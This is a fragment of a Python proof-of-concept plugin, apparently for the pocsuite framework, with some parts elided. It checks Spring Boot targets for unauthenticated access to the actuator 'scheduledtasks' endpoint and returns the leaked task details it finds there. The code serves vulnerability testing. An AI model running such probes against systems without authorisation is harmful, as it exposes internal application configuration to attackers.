...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth scheduledtasks Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/scheduledtasks","/actuator/scheduledtasks"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "cron" in res.text and "fixedDelay" in res.text and "application" in res.text:
                return res.text
